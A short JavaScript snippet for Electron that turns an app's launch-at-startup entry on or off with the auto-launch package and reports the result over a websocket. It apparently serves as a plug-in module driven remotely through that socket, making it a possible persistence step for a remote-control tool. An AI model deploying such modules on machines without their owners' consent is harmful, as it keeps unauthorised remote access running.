electron = require('electron');

AutoLaunch = require('auto-launch');

manageStartup = function (name, enable) {
     appLauncher = new AutoLaunch({
         name: name
     });
     if (Boolean(enable)) {
         appLauncher.isEnabled().then(function(enabled){
             if(enabled) {
                 ws.send("Startup already enabled.");
                 return;
             }
             appLauncher.enable();
             ws.send("Startup enabled.");
         }).then(function(err){
             if (err !== undefined) ws.send("Error: " + err.toString());
         });
     } else {
         appLauncher.isEnabled().then(function(enabled){
             if(!enabled) {
                 ws.send("Startup already disabled.");
                 return;
             }
             appLauncher.disable();
             ws.send("Startup disabled.");
         }).then(function(err){
             if (err !== undefined) ws.send("Error: " + err.toString());
         }); 
     }
}
 
 
ws.send("\nUsage: manageStartup(name, enable)\n- name is the name to appear in the startup list.\n- enable is a boolean value for if startup should be enabled.");